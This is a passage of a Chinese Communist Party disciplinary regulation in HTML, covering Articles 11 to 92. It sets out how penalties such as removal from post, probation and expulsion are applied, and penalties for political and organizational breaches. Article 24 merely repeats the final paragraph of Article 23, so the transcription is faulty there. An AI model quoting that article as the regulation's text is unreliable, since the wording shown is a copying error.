<p>  <strong>第十一条</strong>　撤销党内职务处分，是指撤销受处分党员由党内选举或者组织任命的党内职务。对于在党内担任两个以上职务的，党组织在作处分决定时，应当明确是撤销其一切职务还是一个或者几个职务。如果决定撤销其一个职务，必须撤销其担任的最高职务。如果决定撤销其两个以上职务，则必须从其担任的最高职务开始依次撤销。对于在党外组织担任职务的，应当建议党外组织撤销其党外职务。</p>
<p>  对于在立案审查中因涉嫌违犯党纪被免职的党员，审查后依照本条例规定应当给予撤销党内职务处分的，应当按照其原任职务给予撤销党内职务处分。对于应当受到撤销党内职务处分，但是本人没有担任党内职务的，应当给予其严重警告处分。同时，在党外组织担任职务的，应当建议党外组织撤销其党外职务。</p>
<p>  党员受到撤销党内职务处分，或者依照前款规定受到严重警告处分的，二年内不得在党内担任和向党外组织推荐担任与其原任职务相当或者高于其原任职务的职务。</p>
<p>  <strong>第十二条</strong>　留党察看处分，分为留党察看一年、留党察看二年。对于受到留党察看处分一年的党员，期满后仍不符合恢复党员权利条件的，应当延长一年留党察看期限。留党察看期限最长不得超过二年。</p>
<p>  党员受留党察看处分期间，没有表决权、选举权和被选举权。留党察看期间，确有悔改表现的，期满后恢复其党员权利；坚持不改或者又发现其他应当受到党纪处分的违纪行为的，应当开除党籍。</p>
<p>  党员受到留党察看处分，其党内职务自然撤销。对于担任党外职务的，应当建议党外组织撤销其党外职务。受到留党察看处分的党员，恢复党员权利后二年内，不得在党内担任和向党外组织推荐担任与其原任职务相当或者高于其原任职务的职务。</p>
<p>  <strong>第十三条</strong>　党员受到开除党籍处分，五年内不得重新入党，也不得推荐担任与其原任职务相当或者高于其原任职务的党外职务。另有规定不准重新入党的，依照规定。</p>
<p>  <strong>第十四条</strong>　党员干部受到党纪处分，需要同时进行组织处理的，党组织应当按照规定给予组织处理。</p>
<p>  党的各级代表大会的代表受到留党察看以上处分的，党组织应当终止其代表资格。</p>
<p>  <strong>第十五条</strong>　对于受到改组处理的党组织领导机构成员，除应当受到撤销党内职务以上处分的外，均自然免职。</p>
<p>  <strong>第十六条</strong>　对于受到解散处理的党组织中的党员，应当逐个审查。其中，符合党员条件的，应当重新登记，并参加新的组织过党的生活；不符合党员条件的，应当对其进行教育、限期改正，经教育仍无转变的，予以劝退或者除名；有违纪行为的，依照规定予以追究。</p>
<h3 id="第三章-纪律处分运用规则"><a href="#第三章-纪律处分运用规则" class="headerlink" title="第三章　纪律处分运用规则"></a>第三章　纪律处分运用规则</h3><p>  <strong>第十七条</strong>　有下列情形之一的，可以从轻或者减轻处分：</p>
<p>  （一）主动交代本人应当受到党纪处分的问题；</p>
<p>  （二）在组织谈话函询、初步核实、立案审查过程中，能够配合核实审查工作，如实说明本人违纪违法事实；</p>
<p>  （三）检举同案人或者其他人应当受到党纪处分或者法律追究的问题，经查证属实，或者有其他立功表现；</p>
<p>  （四）主动挽回损失、消除不良影响或者有效阻止危害结果发生；</p>
<p>  （五）主动上交或者退赔违纪所得；</p>
<p>  （六）党内法规规定的其他从轻或者减轻处分情形。</p>
<p>  <strong>第十八条</strong>　根据案件的特殊情况，由中央纪委决定或者经省（部）级纪委（不含副省级市纪委）决定并呈报中央纪委批准，对违纪党员也可以在本条例规定的处分幅度以外减轻处分。</p>
<p>  <strong>第十九条</strong>　对于党员违犯党纪应当给予警告或者严重警告处分，但是具有本条例第十七条规定的情形之一或者本条例分则中另有规定的，可以给予批评教育、责令检查、诫勉或者组织处理，免予党纪处分。对违纪党员免予处分，应当作出书面结论。</p>
<p>  党员有作风纪律方面的苗头性、倾向性问题或者违犯党纪情节轻微的，可以给予谈话提醒、批评教育、责令检查等，或者予以诫勉，不予党纪处分。</p>
<p>  党员行为虽然造成损失或者后果，但不是出于故意或者过失，而是由于不可抗力等原因所引起的，不追究党纪责任。</p>
<p>  <strong>第二十条</strong>　有下列情形之一的，应当从重或者加重处分：</p>
<p>  （一）强迫、唆使他人违纪；</p>
<p>  （二）拒不上交或者退赔违纪所得；</p>
<p>  （三）违纪受处分后又因故意违纪应当受到党纪处分；</p>
<p>  （四）违纪受处分后，又被发现其受处分前没有交代的其他应当受到党纪处分的问题；</p>
<p>  （五）党内法规规定的其他从重或者加重处分情形。</p>
<p>  <strong>第二十一条</strong>　党员在党纪处分影响期内又受到党纪处分的，其影响期为原处分尚未执行的影响期与新处分影响期之和。</p>
<p>  &nbsp;<strong>第二十二条</strong>　从轻处分，是指在本条例规定的违纪行为应当受到的处分幅度以内，给予较轻的处分。</p>
<p>  从重处分，是指在本条例规定的违纪行为应当受到的处分幅度以内，给予较重的处分。</p>
<p>  <strong>第二十三条</strong>　减轻处分，是指在本条例规定的违纪行为应当受到的处分幅度以外，减轻一档给予处分。</p>
<p>  加重处分，是指在本条例规定的违纪行为应当受到的处分幅度以外，加重一档给予处分。</p>
<p>  本条例规定的只有开除党籍处分一个档次的违纪行为，不适用第一款减轻处分的规定。</p>
<p>  <strong>第二十四条</strong>本条例规定的只有开除党籍处分一个档次的违纪行为，不适用第一款减轻处分的规定。</p>
<p>  <strong>第二十五条</strong> 　一个违纪行为同时触犯本条例两个以上条款的，依照处分较重的条款定性处理。</p>
<p>  一个条款规定的违纪构成要件全部包含在另一个条款规定的违纪构成要件中，特别规定与一般规定不一致的，适用特别规定。</p>
<p>  <strong>第二十六条</strong>　二人以上共同故意违纪的，对为首者，从重处分，本条例另有规定的除外；对其他成员，按照其在共同违纪中所起的作用和应负的责任，分别给予处分。</p>
<p>  对于经济方面共同违纪的，按照个人参与数额及其所起作用，分别给予处分。对共同违纪的为首者，情节严重的，按照共同违纪的总数额处分。</p>
<p>  教唆他人违纪的，应当按照其在共同违纪中所起的作用追究党纪责任。</p>
<p>  <strong>第二十七条</strong>　党组织领导机构集体作出违犯党纪的决定或者实施其他违犯党纪的行为，对具有共同故意的成员，按共同违纪处理；对过失违纪的成员，按照各自在集体违纪中所起的作用和应负的责任分别给予处分。</p>
<h3 id="第四章-对违法犯罪党员的纪律处分"><a href="#第四章-对违法犯罪党员的纪律处分" class="headerlink" title="第四章　对违法犯罪党员的纪律处分"></a>第四章　对违法犯罪党员的纪律处分</h3><p>  <strong>第二十八条</strong>　对违法犯罪的党员，应当按照规定给予党纪处分，做到适用纪律和适用法律有机融合，党纪政务等处分相匹配。</p>
<p>  <strong>第二十九条</strong>　党组织在纪律审查中发现党员有贪污贿赂、滥用职权、玩忽职守、权力寻租、利益输送、徇私舞弊、浪费国家资财等违反法律涉嫌犯罪行为的，应当给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第三十条</strong>　党组织在纪律审查中发现党员有刑法规定的行为，虽不构成犯罪但须追究党纪责任的，或者有其他破坏社会主义市场经济秩序、违反治安管理等违法行为，损害党、国家和人民利益的，应当视具体情节给予警告直至开除党籍处分。</p>
<p>  违反国家财经纪律，在公共资金收支、税务管理、国有资产管理、政府采购管理、金融管理、财务会计管理等财经活动中有违法行为的，依照前款规定处理。</p>
<p>  党员有嫖娼或者吸食、注射毒品等丧失党员条件，严重败坏党的形象行为的，应当给予开除党籍处分。</p>
<p>  <strong>第三十一条</strong>　党组织在纪律审查中发现党员严重违纪涉嫌违法犯罪的，原则上先作出党纪处分决定，并按照规定由监察机关给予政务处分或者由任免机关（单位）给予处分后，再移送有关国家机关依法处理。</p>
<p>  <strong>第三十二条</strong>　党员被依法留置、逮捕的，党组织应当按照管理权限中止其表决权、选举权和被选举权等党员权利。根据监察机关、司法机关处理结果，可以恢复其党员权利的，应当及时予以恢复。</p>
<p>  <strong>第三十三条</strong>　党员犯罪情节轻微，人民检察院依法作出不起诉决定的，或者人民法院依法作出有罪判决并免予刑事处罚的，应当给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  党员犯罪，被单处罚金的，依照前款规定处理。</p>
<p>  <strong>第三十四条</strong>　党员犯罪，有下列情形之一的，应当给予开除党籍处分：</p>
<p>  （一）因故意犯罪被依法判处刑法规定的主刑（含宣告缓刑）；</p>
<p>  （二）被单处或者附加剥夺政治权利；</p>
<p>  （三）因过失犯罪，被依法判处三年以上（不含三年）有期徒刑。</p>
<p>  因过失犯罪被判处三年以下有期徒刑或者被判处管制、拘役的，一般应当开除党籍。对于个别可以不开除党籍的，应当对照处分违纪党员批准权限的规定，报请再上一级党组织批准。</p>
<p>  <strong>第三十五条</strong>　党员依法受到刑事责任追究的，党组织应当根据司法机关的生效判决、裁定、决定及其认定的事实、性质和情节，依照本条例规定给予党纪处分，是公职人员的由监察机关给予相应政务处分或者由任免机关（单位）给予相应处分。</p>
<p>  党员依法受到政务处分、任免机关（单位）给予的处分、行政处罚，应当追究党纪责任的，党组织可以根据生效的处分、行政处罚决定认定的事实、性质和情节，经核实后依照规定给予相应党纪处分或者组织处理。其中，党员依法受到撤职以上处分的，应当依照本条例规定给予撤销党内职务以上处分。</p>
<p>  党员违反国家法律法规、企事业单位或者其他社会组织的规章制度受到其他处分，应当追究党纪责任的，党组织在对有关方面认定的事实、性质和情节进行核实后，依照规定给予相应党纪处分或者组织处理。</p>
<p>  党组织作出党纪处分或者组织处理决定后，监察机关、司法机关、行政机关等依法改变原生效判决、裁定、决定等，对原党纪处分或者组织处理决定产生影响的，党组织应当根据改变后的生效判决、裁定、决定等重新作出相应处理。</p>
<h3 id="第五章-其他规定"><a href="#第五章-其他规定" class="headerlink" title="第五章　其他规定"></a>第五章　其他规定</h3><p>  <strong>第三十六条</strong>　预备党员违犯党纪，情节较轻，可以保留预备党员资格的，党组织应当对其批评教育或者延长预备期；情节较重的，应当取消其预备党员资格。</p>
<p>  <strong>第三十七条</strong>　对违纪后下落不明的党员，应当区别情况作出处理：</p>
<p>  （一）对有严重违纪行为，应当给予开除党籍处分的，党组织应当作出决定，开除其党籍；</p>
<p>  （二）除前项规定的情况外，下落不明时间超过六个月的，党组织应当按照党章规定对其予以除名。</p>
<p>  <strong>第三十八条</strong>　违纪党员在党组织作出处分决定前死亡，或者在死亡之后发现其曾有严重违纪行为，对于应当给予开除党籍处分的，开除其党籍；对于应当给予留党察看以下处分的，作出违犯党纪的书面结论和相应处理。</p>
<p>  <strong>第三十九条</strong>　违纪行为有关责任人员的区分：</p>
<p>  （一）直接责任者，是指在其职责范围内，不履行或者不正确履行自己的职责，对造成的损失或者后果起决定性作用的党员或者党员领导干部；</p>
<p>  （二）主要领导责任者，是指在其职责范围内，对主管的工作不履行或者不正确履行职责，对造成的损失或者后果负直接领导责任的党员领导干部；</p>
<p>  （三）重要领导责任者，是指在其职责范围内，对应管的工作或者参与决定的工作不履行或者不正确履行职责，对造成的损失或者后果负次要领导责任的党员领导干部。</p>
<p>  本条例所称领导责任者，包括主要领导责任者和重要领导责任者。</p>
<p>  <strong>第四十条</strong>　本条例所称主动交代，是指涉嫌违纪的党员在组织谈话函询、初步核实前向有关组织交代自己的问题，或者在谈话函询、初步核实和立案审查期间交代组织未掌握的问题。</p>
<p>  <strong>第四十一条</strong>　担任职级、单独职务序列等级的党员干部违犯党纪受到处分，需要对其职级、单独职务序列等级进行调整的，参照本条例关于党外职务的规定执行。</p>
<p>  <strong>第四十二条</strong>　计算经济损失应当计算立案时已经实际造成的全部财产损失，包括为挽回违纪行为所造成损失而支付的各种开支、费用。立案后至处理前持续发生的经济损失，应当一并计算在内。</p>
<p>  <strong>第四十三条</strong>　对于违纪行为所获得的经济利益，应当收缴或者责令退赔。对于主动上交的违纪所得和经济损失赔偿，应当予以接收，并按照规定收缴或者返还有关单位、个人。</p>
<p>  对于违纪行为所获得的职务、职级、职称、学历、学位、奖励、资格等其他利益，应当由承办案件的纪检机关或者由其上级纪检机关建议有关组织、部门、单位按照规定予以纠正。</p>
<p>  对于依照本条例第三十七条、第三十八条规定处理的党员，经调查确属其实施违纪行为获得的利益，依照本条规定处理。</p>
<p>  <strong>第四十四条</strong>　党纪处分决定作出后，应当在一个月内向受处分党员所在党的基层组织中的全体党员及其本人宣布，是领导班子成员的还应当向所在党组织领导班子宣布，并按照干部管理权限和组织关系将处分决定材料归入受处分者档案；对于受到撤销党内职务以上处分的，还应当在一个月内办理职务、工资、工作及其他有关待遇等相应变更手续；涉及撤销或者调整其党外职务的，应当建议党外组织及时撤销或者调整其党外职务。特殊情况下，经作出或者批准作出处分决定的组织批准，可以适当延长办理期限。办理期限最长不得超过六个月。</p>
<p>  <strong>第四十五条</strong>　执行党纪处分决定的机关或者受处分党员所在单位，应当在六个月内将处分决定的执行情况向作出或者批准处分决定的机关报告。</p>
<p>  党员对所受党纪处分不服的，可以依照党章及有关规定提出申诉。</p>
<p>  <strong>第四十六条</strong>　党员因违犯党纪受到处分，影响期满后，党组织无需取消对其的处分。</p>
<p>  <strong>第四十七条</strong>　本条例所称以上、以下，除有特别标明外均含本级、本数。</p>
<p>  <strong>第四十八条</strong>　本条例总则适用于有党纪处分规定的其他党内法规，但是中共中央发布或者批准发布的其他党内法规有特别规定的除外。</p>
<h2 id="第二编-分则"><a href="#第二编-分则" class="headerlink" title="第二编　分则"></a>第二编　分则</h2><h3 id="第六章-对违反政治纪律行为的处分"><a href="#第六章-对违反政治纪律行为的处分" class="headerlink" title="第六章　对违反政治纪律行为的处分"></a>第六章　对违反政治纪律行为的处分</h3><p>  <strong>第四十九条</strong>　在重大原则问题上不同党中央保持一致且有实际言论、行为或者造成不良后果的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第五十条</strong>　通过网络、广播、电视、报刊、传单、书籍等，或者利用讲座、论坛、报告会、座谈会等方式，公开发表坚持资产阶级自由化立场、反对四项基本原则，反对党的改革开放决策的文章、演说、宣言、声明等的，给予开除党籍处分。</p>
<p>  发布、播出、刊登、出版前款所列文章、演说、宣言、声明等或者为上述行为提供方便条件的，对直接责任者和领导责任者，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第五十一条</strong>　通过网络、广播、电视、报刊、传单、书籍等，或者利用讲座、论坛、报告会、座谈会等方式，有下列行为之一，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）公开发表违背四项基本原则，违背、歪曲党的改革开放决策，或者其他有严重政治问题的文章、演说、宣言、声明等；</p>
<p>  （二）妄议党中央大政方针，破坏党的集中统一；</p>
<p>  （三）丑化党和国家形象，或者诋毁、诬蔑党和国家领导人、英雄模范，或者歪曲党的历史、中华人民共和国历史、人民军队历史。</p>
<p>  发布、播出、刊登、出版前款所列内容或者为上述行为提供方便条件的，对直接责任者和领导责任者，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第五十二条</strong>　制作、贩卖、传播第五十条、第五十一条所列内容之一的报刊、书籍、音像制品、电子读物，以及网络文本、图片、音频、视频资料等，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  私自携带、寄递第五十条、第五十一条所列内容之一的报刊、书籍、音像制品、电子读物等入出境，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  私自阅看、浏览、收听第五十条、第五十一条所列内容之一的报刊、书籍、音像制品、电子读物，以及网络文本、图片、音频、视频资料等，情节严重的，给予警告、严重警告或者撤销党内职务处分。</p>
<p>  <strong>第五十三条</strong>　在党内组织秘密集团或者组织其他分裂党的活动的，给予开除党籍处分。</p>
<p>  参加秘密集团或者参加其他分裂党的活动的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第五十四条</strong>　在党内搞团团伙伙、结党营私、拉帮结派、政治攀附、培植个人势力等非组织活动，或者通过搞利益交换、为自己营造声势等活动捞取政治资本的，给予严重警告或者撤销党内职务处分；导致本地区、本部门、本单位政治生态恶化的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第五十五条</strong>　搞投机钻营，结交政治骗子或者被政治骗子利用的，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p>
<p>  充当政治骗子的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第五十六条</strong>　党员领导干部在本人主政的地方或者分管的部门自行其是，搞山头主义，拒不执行党中央确定的大政方针，甚至背着党中央另搞一套的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  贯彻党中央决策部署只表态不落实，或者落实党中央决策部署不坚决，打折扣、搞变通，在政治上造成不良影响或者严重后果的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  不顾党和国家大局，搞部门或者地方保护主义的，依照前款规定处理。</p>
<p>  <strong>第五十七条</strong>　党员领导干部政绩观错位，违背新发展理念、背离高质量发展要求，给党、国家和人民利益造成较大损失的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  搞劳民伤财的“形象工程”、“政绩工程”的，从重或者加重处分。</p>
<p>  <strong>第五十八条</strong>　对党不忠诚不老实，表里不一，阳奉阴违，欺上瞒下，搞两面派，做两面人，在政治上造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第五十九条</strong>　制造、散布、传播政治谣言，破坏党的团结统一的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  政治品行恶劣，匿名诬告，有意陷害或者制造其他谣言，造成损害或者不良影响的，依照前款规定处理。</p>
<p>  <strong>第六十条</strong>　擅自对应当由党中央决定的重大政策问题作出决定、对外发表主张的，对直接责任者和领导责任者，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第六十一条</strong>　不按照有关规定向组织请示、报告重大事项，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第六十二条</strong>　干扰巡视巡察工作或者不落实巡视巡察整改要求，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第六十三条</strong>　对抗组织审查，有下列行为之一的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）串供或者伪造、销毁、转移、隐匿证据；</p>
<p>  （二）阻止他人揭发检举、提供证据材料；</p>
<p>  （三）包庇同案人员；</p>
<p>  （四）向组织提供虚假情况，掩盖事实；</p>
<p>  （五）其他对抗组织审查行为。</p>
<p>  <strong>第六十四条</strong>　组织、参加反对党的基本理论、基本路线、基本方略或者重大方针政策的集会、游行、示威等活动的，或者以组织讲座、论坛、报告会、座谈会等方式，反对党的基本理论、基本路线、基本方略或者重大方针政策，造成严重不良影响的，对策划者、组织者和骨干分子，给予开除党籍处分。</p>
<p>  对其他参加人员或者以提供信息、资料、财物、场地等方式支持上述活动者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p>
<p>  未经组织批准参加其他集会、游行、示威等活动，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第六十五条</strong>　组织、参加旨在反对党的领导、反对社会主义制度或者敌视政府等组织的，对策划者、组织者和骨干分子，给予开除党籍处分。</p>
<p>  对其他参加人员，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第六十六条</strong>　组织、参加会道门或者邪教组织的，对策划者、组织者和骨干分子，给予开除党籍处分。</p>
<p>  对其他参加人员，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对不明真相的参加人员，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p>
<p>  <strong>第六十七条</strong>　从事、参与挑拨破坏民族关系制造事端或者参加民族分裂活动的，对策划者、组织者和骨干分子，给予开除党籍处分。</p>
<p>  对其他参加人员，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p>
<p>  有其他违反党和国家民族政策的行为，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第六十八条</strong>　组织、利用宗教活动反对党的理论、路线、方针、政策和决议，破坏民族团结的，对策划者、组织者和骨干分子，给予开除党籍处分。</p>
<p>  对其他参加人员，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p>
<p>  有其他违反党和国家宗教政策的行为，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第六十九条</strong>　对信仰宗教的党员，应当加强思想教育，要求其限期改正；经党组织帮助教育仍没有转变的，应当劝其退党；劝而不退的，予以除名；参与利用宗教搞煽动活动的，给予开除党籍处分。</p>
<p>  <strong>第七十条</strong>　组织迷信活动的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  参加迷信活动或者个人搞迷信活动，造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对不明真相的参加人员，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p>
<p>  <strong>第七十一条</strong>　组织、利用宗族势力对抗党和政府，妨碍党和国家的方针政策以及决策部署的实施，或者破坏党的基层组织建设的，对策划者、组织者和骨干分子，给予开除党籍处分。</p>
<p>  对其他参加人员，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p>
<p>  <strong>第七十二条</strong>　在国（境）外、外国驻华使（领）馆申请政治避难，或者违纪后逃往国（境）外、外国驻华使（领）馆的，给予开除党籍处分。</p>
<p>  在国（境）外公开发表反对党和政府的文章、演说、宣言、声明等的，依照前款规定处理。</p>
<p>  故意为上述行为提供方便条件的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第七十三条</strong>　在涉外活动中，其言行在政治上造成恶劣影响，损害党和国家尊严、利益的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第七十四条</strong>　不履行全面从严治党主体责任、监督责任或者履行全面从严治党主体责任、监督责任不力，给党组织造成严重损害或者严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第七十五条</strong>　党员领导干部对违反政治纪律和政治规矩等错误思想和行为不报告、不抵制、不斗争，放任不管，搞无原则一团和气，造成不良影响的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第七十六条</strong>　违反党的优良传统和工作惯例等党的规矩，在政治上造成不良影响或者严重后果的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<h3 id="第七章-对违反组织纪律行为的处分"><a href="#第七章-对违反组织纪律行为的处分" class="headerlink" title="第七章　对违反组织纪律行为的处分"></a>第七章　对违反组织纪律行为的处分</h3><p>  <strong>第七十七条</strong>　违反民主集中制原则，有下列行为之一的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p>
<p>  （一）拒不执行或者擅自改变党组织作出的重大决定；</p>
<p>  （二）违反议事规则，个人或者少数人决定重大问题；</p>
<p>  （三）故意规避集体决策，决定重大事项、重要干部任免、重要项目安排和大额资金使用；</p>
<p>  （四）借集体决策名义集体违规。</p>
<p>  <strong>第七十八条</strong>　下级党组织拒不执行或者擅自改变上级党组织决定的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第七十九条</strong>　拒不执行党组织的分配、调动、交流等决定的，给予警告、严重警告或者撤销党内职务处分。</p>
<p>  在特殊时期或者紧急状况下，拒不执行党组织上述决定的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第八十条</strong>　在党组织纪律审查中，依法依规负有作证义务的党员拒绝作证或者故意提供虚假情况，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第八十一条</strong>　有下列行为之一，情节较重的，给予警告或者严重警告处分：</p>
<p>  （一）违反个人有关事项报告规定，隐瞒不报；</p>
<p>  （二）在组织进行谈话函询时，不如实向组织说明问题；</p>
<p>  （三）不按要求报告或者不如实报告个人去向；</p>
<p>  （四）不如实填报个人档案资料。</p>
<p>  有前款第二项规定的行为，同时向组织提供虚假情况、掩盖事实的，依照本条例第六十三条规定处理。</p>
<p>  篡改、伪造个人档案资料的，给予严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  　隐瞒入党前严重错误的，一般应当予以除名；对入党多年且一贯表现好，或者在工作中作出突出贡献的，给予严重警告、撤销党内职务或者留党察看处分。</p>
<p>  <strong>第八十二条</strong>　党员领导干部违反有关规定组织、参加自发成立的老乡会、校友会、战友会等，情节严重的，给予警告、严重警告或者撤销党内职务处分。</p>
<p>  <strong>第八十三条</strong>　有下列行为之一的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）在民主推荐、民主测评、组织考察和党内选举中搞拉票、助选等非组织活动；</p>
<p>  （二）在法律规定的投票、选举活动中违背组织原则搞非组织活动，组织、怂恿、诱使他人投票、表决；</p>
<p>  （三）在选举中进行其他违反党章、其他党内法规和有关章程活动。</p>
<p>  搞有组织的拉票贿选，或者用公款拉票贿选的，从重或者加重处分。</p>
<p>  <strong>第八十四条</strong>　在干部选拔任用工作中，有任人唯亲、排斥异己、封官许愿、说情干预、跑官要官、突击提拔或者调整干部等违反干部选拔任用规定行为，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  用人失察失误造成严重后果的，对直接责任者和领导责任者，依照前款规定处理。</p>
<p>  <strong>第八十五条</strong>　在推进领导干部能上能下工作中，搞好人主义，有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p>
<p>  （一）以党纪政务等处分规避组织调整；</p>
<p>  （二）以组织调整代替党纪政务等处分；</p>
<p>  （三）其他避重就轻作出处理行为。</p>
<p>  <strong>第八十六条</strong>　在干部、职工的录用、考核、职务职级晋升、职称评聘、荣誉表彰，授予学术称号和征兵、安置退役军人等工作中，隐瞒、歪曲事实真相，或者利用职权或者职务上的影响违反有关规定为本人或者其他人谋取利益的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  弄虚作假，骗取职务、职级、职称、待遇、资格、学历、学位、荣誉、称号或者其他利益的，依照前款规定处理。</p>
<p>  <strong>第八十七条</strong>　侵犯党员的表决权、选举权和被选举权，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  以强迫、威胁、欺骗、拉拢等手段，妨害党员自主行使表决权、选举权和被选举权的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第八十八条</strong>　有下列行为之一的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）对批评、检举、控告进行阻挠、压制，或者将批评、检举、控告材料私自扣压、销毁，或者故意将其泄露给他人；</p>
<p>  （二）对党员的申辩、辩护、作证等进行压制，造成不良后果；</p>
<p>  （三）压制党员申诉，造成不良后果，或者不按照有关规定处理党员申诉；</p>
<p>  （四）其他侵犯党员权利行为，造成不良后果。</p>
<p>  对批评人、检举人、控告人、证人及其他人员打击报复的，从重或者加重处分。</p>
<p>  <strong>第八十九条</strong>　违反党章和其他党内法规的规定，采取弄虚作假或者其他手段把不符合党员条件的人发展为党员，或者为非党员出具党员身份证明的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  违反有关规定程序发展党员的，对直接责任者和领导责任者，依照前款规定处理。</p>
<p>  <strong>第九十条</strong>　违反有关规定取得外国国籍或者获取国（境）外永久居留资格、长期居留许可的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第九十一条</strong>　违反有关规定办理因私出国（境）证件、前往港澳通行证，或者未经批准出入国（边）境，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  虽经批准因私出国（境）但存在擅自变更路线、无正当理由超期未归等超出批准范围出国（境）行为，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第九十二条</strong>　驻外机构或者临时出国（境）团（组）中的党员擅自脱离组织，或者从事外事、机要、军事等工作的党员违反有关规定同国（境）外机构、人员联系和交往的，给予警告、严重警告或者撤销党内职务处分。</p>
